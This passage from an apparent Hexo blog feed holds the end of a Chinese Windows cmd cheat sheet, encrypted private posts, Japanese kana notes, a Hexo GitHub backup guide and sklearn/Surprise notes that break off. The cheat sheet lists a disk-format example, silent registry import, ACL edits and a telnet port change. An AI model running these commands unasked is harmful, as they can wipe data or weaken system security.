&gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p><p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p><p>　　find 文件名 查找某文件</p><p>　　title 标题名字 更改CMD窗口标题名字</p><p>　　color 颜色值  设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p><p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p><p>　　ver 在DOS窗口下显示版本信息 </p><p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p><p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p><p>　　md　目录名 创建目录</p><p>　　replace 源文件　要替换文件的目录 替换文件</p><p>　　ren 原文件名　新文件名 重命名文件名</p><p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p><p>　　type 文件名 显示文本文件的内容</p><p>　　more 文件名 逐屏显示输出文件</p><p>　　doskey 要锁定的命令=字符</p><p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey  dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p><p>　　taskmgr 调出任务管理器</p><p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p><p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p><p>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p><p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p><p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p><p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p><p>　　regedit /e 注册表文件名 导出注册表</p><p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm  替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F  完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p><p>　　cacls 文件名 查看文件的访问用户权限列表</p><p>　　REM 文本内容 在批处理文件中添加注解</p><p>　　netsh 查看或更改本地网络配置情况</p><p>　　</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/5.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
      <category term="cmd" scheme="http://javastar.club/categories/cmd/"/>
    
    
      <category term="cmd" scheme="http://javastar.club/tags/cmd/"/>
    
  </entry>
  
  <entry>
    <title>French</title>
    <link href="http://javastar.club/archives/a8d9cb68.html"/>
    <id>http://javastar.club/archives/a8d9cb68.html</id>
    <published>2019-08-10T02:58:02.000Z</published>
    <updated>2019-08-23T03:26:59.637Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19vZCG3Lqu35XxdAlNadhPKMBdHhq4Dvg+jstYVxIbCgo8+Xkwq4+MapPCIJk1tB9HWb/Fn9jGbtIdIjjqpF0T4GfQ0Dp1ASsxO7fshYQ2tswqKkRGB7E/KPvUKaM+GHzgXZKWQMgt/GPZhS7p0XMGx2951SO66ooKn0PBnY8G/57owFQ6yLr6JS/sE8kt/42wG51tI/vlrunnICDEFfUoQhSVWJEBVHuynw7yfgcylPAg8MNzEtAdOc5n4cZmp9XR2UAbfatJhDe0eDF/zCtFq/TtoefjQTCWnI3GatwLUTvThMmPGd6CYtDWAgmU3ApAxGbO0yBhumw==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="French" scheme="http://javastar.club/categories/French/"/>
    
    
      <category term="French" scheme="http://javastar.club/tags/French/"/>
    
  </entry>
  
  <entry>
    <title>hexo搭建博客记录</title>
    <link href="http://javastar.club/archives/5910dd1d.html"/>
    <id>http://javastar.club/archives/5910dd1d.html</id>
    <published>2019-08-10T01:27:16.000Z</published>
    <updated>2019-08-23T03:38:19.221Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="hexo" scheme="http://javastar.club/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://javastar.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>日语入门手册0</title>
    <link href="http://javastar.club/archives/37fae12e.html"/>
    <id>http://javastar.club/archives/37fae12e.html</id>
    <published>2019-08-09T13:00:13.000Z</published>
    <updated>2019-08-10T07:24:14.773Z</updated>
    
    <content type="html"><![CDATA[<p>  我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。</p><a id="more"></a><h3 id="五十音清音发音学习笔记"><a href="#五十音清音发音学习笔记" class="headerlink" title="五十音清音发音学习笔记"></a>五十音清音发音学习笔记</h3><p>あア a 类似汉语“啊”，在日语中开口最大，双唇自然张开，口形比汉语“啊”小，声音洪亮<br>いイ i  类似汉语“衣”，比发“衣”时双唇略松，口角咧开较小，声音较尖<br>うウ u  类似汉语“乌”，双唇自然微启，嘴角微拉，双唇不突出，舌面较平，声音较弱。双唇不要象发“乌”那样向前突出，部分老师要求发音时后槽牙接触，以把握口型位置。<br>えエ  e 类似汉语“唉”，双唇稍向左右咧开，舌面放平，声音紧张<br>おオ o  类似汉语“欧”，嘴唇合拢略椭圆形，口型大小处于「あ」和「う」之间，舌面较平，声音圆浑<br>かカ ka 类似拼音“ka”<br>きキ ki  类似拼音“ki”<br>くク ku 类似拼音“ku”，嘴唇平的，双唇不突出。<br>けケ ke  类似英语音标“ke”，也就是单词care/ker/的前半部分<br>こコ ko 类似汉语“扣”，<br>さサ sa 类似汉语“仨”<br>しシshi  类似汉语“西”，注意是发音是“xi”。打字的时候打si也能打出来<br>すス su  发音难以描述，不能直接发成“苏”，像是用“丝”的口型发“苏”的样子。也有些时候直接读“丝”。只发了s的音，网上查到的说法是元音u被清化（即只保留元音的口形和舌位而不发声）<br>せセ  se 类似英语音标“se”，self/self/的前半部分<br>そソ so 类似英语单词“so”<br>たタ ta 类似汉语“他”<br>ちチchi  类似汉语“七”，注意是发音是“qi”。打字的时候打ti也能打出来<br>つツtsu  发音难以描述，像是用“呲”的口型发“粗”的样子。也有建议直接念“呲”的。大写的时候发音，小写的时候是促音不发音。同理打字可以打tu<br>てテ te  类似汉语“胎”<br>とト to 类似汉语“偷”<br>なナ na 类似汉语“那”，な行没什么特殊的，就是n和あ行拼在一起<br>にニ ni  类似汉语“你”<br>ぬヌ nu 类似汉语“奴”<br>ねネ ne 类似汉语“奶”<br>のノ no 类似英语单词“no”<br>はハ ha  类似汉语“哈”，两种读音，平时读ha，助词的时候读wa<br>ひヒ hi 类似英语单词“he”。He is a boy那个he。<br>ふフ fu  类似汉语“夫”，但是不咬唇，上齿接近下唇但有缝隙，不震动声带，只是气流摩擦。罗马音hu、fu都可以<br>へヘ he  类似汉语“嗨”。做助词的时读做e(え)<br>ほホ ho 类似汉语“吼”，类似hold住的ho。<br>まマ ma  类似汉语“马”，ま行没什么特殊的，就是m和あ行拼在一起<br>みミ mi 类似汉语“咪”<br>むム mu 类似汉语“木”<br>めメ me  类似汉语“买”<br>もモ mo 类似汉语“哞”<br>やヤ ya 类似汉语“呀”<br>ゆユ yu 类似英语单词“you”<br>よヨ yo  类似汉语“腰”<br>らラ ra 类似汉语“拉”，ら行r其实是汉语发音里的l，就是l和あ行拼在一起<br>りリ ri 类似汉语“哩”<br>るル ru  类似汉语“撸”<br>れレ re 类似英语音标“le”，let’s go的le<br>ろロ ro 类似汉语“唠”<br>わワ wa  类似汉语“哇”<br>をヲ wo 和おo同音，只做助词，所以不会在单词里出现。<br>んン n 用鼻腔通气发出的声音，不单用，也不出现在词首</p><h3 id="发音："><a href="#发音：" class="headerlink" title="发音："></a>发音：</h3><p><a href="https://jp.hjenglish.com/subject/pronounce_write/" rel="external nofollow noopener noreferrer" target="_blank">https://jp.hjenglish.com/subject/pronounce_write/</a></p><h3 id="记忆："><a href="#记忆：" class="headerlink" title="记忆："></a>记忆：</h3><p><a href="https://www.zhihu.com/question/20318161/answer/67015673" rel="external nofollow noopener noreferrer" target="_blank">https://www.zhihu.com/question/20318161/answer/67015673</a></p><p>电子版教材：</p><p>链接：<a href="https://pan.baidu.com/s/1NvpcbYvQWeghwvv_T7X8rg" rel="external nofollow noopener noreferrer" target="_blank">https://pan.baidu.com/s/1NvpcbYvQWeghwvv_T7X8rg</a><br>提取码：0gx4<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;
  我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。
&lt;/p&gt;
    
    </summary>
    
      <category term="language" scheme="http://javastar.club/categories/language/"/>
    
    
      <category term="日语" scheme="http://javastar.club/tags/%E6%97%A5%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>第六次日记</title>
    <link href="http://javastar.club/archives/f7899fcc.html"/>
    <id>http://javastar.club/archives/f7899fcc.html</id>
    <published>2019-08-09T12:55:49.000Z</published>
    <updated>2019-08-23T03:18:19.918Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="日记" scheme="http://javastar.club/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://javastar.club/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>哲学</title>
    <link href="http://javastar.club/archives/5da32671.html"/>
    <id>http://javastar.club/archives/5da32671.html</id>
    <published>2019-08-09T12:54:21.000Z</published>
    <updated>2019-08-23T03:18:30.781Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="哲学" scheme="http://javastar.club/categories/%E5%93%B2%E5%AD%A6/"/>
    
    
      <category term="哲学" scheme="http://javastar.club/tags/%E5%93%B2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>hexo 博客备份</title>
    <link href="http://javastar.club/archives/b5d2c57b.html"/>
    <id>http://javastar.club/archives/b5d2c57b.html</id>
    <published>2019-08-08T07:10:35.000Z</published>
    <updated>2019-08-10T02:57:08.525Z</updated>
    
    <content type="html"><![CDATA[<p>hexo博客备份指南<br><img src="https://github.com/starstarb/clouding/raw/master/picture/4.jpg" alt></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  由于之前忘记备份Hexo博客的markdown文件，在重做系统时候还忘记备份博客了，导致现在不得不重新从网页上扒下来之前的文章重新写一遍，十分耗费精力。因此在网上找了下如何备份Hexo博客，在此记录下。</p><p>  目前假设Git和Github环境已经配置好了，如果没有配置好详见「Ubuntu16.04下Github配置」。<br>Git相关操作请参考廖雪峰的Git教程。</p><h3 id="备份博客"><a href="#备份博客" class="headerlink" title="备份博客"></a>备份博客</h3><p>目前假设本地Hexo博客已经初始化。</p><p>###创建新分支</p><p>在Github.io上建立博客时已经开了一个新仓库了，如果再开另一个仓库存放源代码有点浪费，因此采用建立新分支的方法备份博客。</p><p>虽然理论上什么时候创建新分支来备份都可以，但是还是建议在建立博客的时候就创建备份分支。（然而我中途才想起来-.-）</p><p>  不过在建立新分支前请确保仓库内已有master分支（Hexo本地建站后第一次上传时会自动生成），否则后期再添加master分支比较麻烦（请自行搜索git命令）。</p><p>本地Git建立新分支命令如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">$ git checkout -b BRANCHNAME</span><br></pre>      </td>    </tr>  </table></figure><p>BRANCHNAME是自定义的新分支的名字，建议起为hexo。<br>建立.gitignore</p><p>建立.gitignore文件将不需要备份的文件屏蔽。个人的.gitignore文件如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre>      </td>    </tr>  </table></figure><p>在Github上备份</p><p>通过如下命令将本地文件备份到Github上。</p><p>假设目前在hexo博客的根目录下。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m &quot;Backup&quot;</span><br><span class="line">$ git push origin hexo</span><br></pre>      </td>    </tr>  </table></figure><p>这样就备份完博客了且在Github上能看到两个分支(master和hexo)。<br>设置默认分支</p><p>  在Github上你的github.io仓库中设置默认分支为hexo。这样有助于之后恢复博客。master分支时默认的博客静态页面分支，在之后恢复博客的时候并不需要。<br>个人备份习惯</p><p>个人而言习惯于先备份文件再生成博客。即先执行<strong>git add .,git commit -m “Backup”,git push    origin hexo</strong>将博客备份完成，然后执行<strong>hexo g -d</strong>发布博客。<br>恢复博客</p><p>目前假设本地Hexo博客基础环境已经搭好。<br>克隆项目到本地</p><p>输入下列命令克隆博客必须文件(hexo分支)：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ git clone https://github.com/yourgithubname/yourgithubname.github.io</span><br></pre>      </td>    </tr>  </table></figure><h3 id="恢复博客"><a href="#恢复博客" class="headerlink" title="恢复博客"></a>恢复博客</h3><p>在克隆的那个文件夹下输入如下命令恢复博客：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">$ npm install hexo-cli</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-deployer-git</span><br></pre>      </td>    </tr>  </table></figure><p>在此不需要执行hexo init这条指令，因为不是从零搭建起新博客。</p><p>完成喵～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo博客备份指南&lt;br&gt;&lt;img src=&quot;https://github.com/starstarb/clouding/raw/master/picture/4.jpg&quot; alt&gt;
&lt;/p&gt;
    
    </summary>
    
    
      <category term="github" scheme="http://javastar.club/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>python数据分析常用库</title>
    <link href="http://javastar.club/archives/460b5ed.html"/>
    <id>http://javastar.club/archives/460b5ed.html</id>
    <published>2019-08-08T07:09:19.000Z</published>
    <updated>2019-08-16T03:11:25.263Z</updated>
    
    <content type="html"><![CDATA[<p>sklearn/surprise<br><img src="https://github.com/starstarb/clouding/raw/master/head/f2deaa2d8bcb907b31c759089e262f09.jpg" alt></p><a id="more"></a><p>网上有很多关于sklearn的学习教程，大部分都是简单的讲清楚某一方面，其实最好的教程就是官方文档。</p><p>　　官方文档地址：<a href="https://scikit-learn.org/stable/" rel="external nofollow noopener noreferrer" target="_blank">https://scikit-learn.org/stable/</a></p><p>  （可是官方文档非常详细，同时许多人对官方文档的理解和结构上都不能很好地把握，我也打算好好学习sklearn，这可能是机器学习的神器），下面先简单介绍一下sklearn。</p><p>  　　自2007年发布以来，scikit-learn已经成为Python重要的机器学习库了，scikit-learn简称sklearn，支持包括分类，回归，降维和聚类四大机器学习算法。还包括了特征提取，数据处理和模型评估者三大模块。</p><p>　　sklearn是Scipy的扩展，建立在Numpy和matplolib库的基础上。利用这几大模块的优势，可以大大的提高机器学习的效率。</p><p>  　　sklearn拥有着完善的文档，上手容易，具有着丰富的API，在学术界颇受欢迎。sklearn已经封装了大量的机器学习算法，包括LIBSVM和LIBINEAR。同时sklearn内置了大量数据集，节省了获取和整理数据集的时间。</p><h4 id="安装surprise库报错"><a href="#安装surprise库报错" class="headerlink" title="安装surprise库报错"></a>安装surprise库报错</h4><p>Surprise是一个开源推荐系统，包含了常用的矩阵分解算法、包括SVD、SVD++，NMF等等，GitHub地址：<a href="https://github.com/NicolasHug/Surprise" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/NicolasHug/Surprise</a><br>参考官方安装方式<br>其中缺少Microsoft  Visual C++14，因此需要安装:<br><strong>安装地址</strong><br>链接：<a href="https://pan.baidu.com/s/1F2vTVhU8SQbMEoSBCk5jPw" rel="external nofollow noopener noreferrer" target="_blank">https://pan.baidu.com/s/1F2vTVhU8SQbMEoSBCk5jPw</a><br>提取码：re39<br>我的windows10安装surprise报错如下：<br><img src="https://github.com/starstarb/clouding/raw/master/python/surprise%E6%8A%A5%E9%94%99.png" alt><br><strong>import    surprise库不报错，但是没有相关SVD    Dataset库</strong><br>cl.exe不存在环境路径配置好后，依然不行，打开cl.exe，报mspdb140.dll不存在，未解决。</p><h3 id="surprise库官方文档分析（一）"><a href="#surprise库官方文档分析（一）" class="headerlink" title="surprise库官方文档分析（一）"></a>surprise库官方文档分析（一）</h3><p><strong>一：入门</strong></p><p>　1、基本用法</p><p>　（1）、自动交叉验证</p><p>　　Surprise有一套内置的 算法和数据集供您使用。在最简单的形式中，只需几行代码即可运行交叉验证程序：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">from surprise import SVD</span><br><span class="line">from surprise import Dataset</span><br><span class="line">from surprise.model_selection import cross_validate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Load the movielens-100k dataset (download it if needed),  </span><br><span class="line"># 加载movielens-100k数据集（如果需要，下载）</span><br><span class="line">data = Dataset.load_builtin(&apos;ml-100k&apos;)</span><br><span class="line"></span><br><span class="line"># ＃我们将使用SVD算法。</span><br><span class="line"># We&apos;ll use the famous SVD algorithm.</span><br><span class="line">algo = SVD()</span><br><span class="line"></span><br><span class="line">#运行5倍交叉验证并打印结果</span><br><span class="line"># Run 5-fold cross-validation and print results</span><br><span class="line">cross_validate(algo, data, measures=[&apos;RMSE&apos;, &apos;MAE&apos;], cv=5, verbose=True)</span><br></pre>      </td>    </tr>  </table></figure><p>输出结果：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">Evaluating RMSE, MAE of algorithm SVD on 5 split(s).</span><br><span class="line"></span><br><span class="line">                  Fold 1  Fold 2  Fold 3  Fold 4  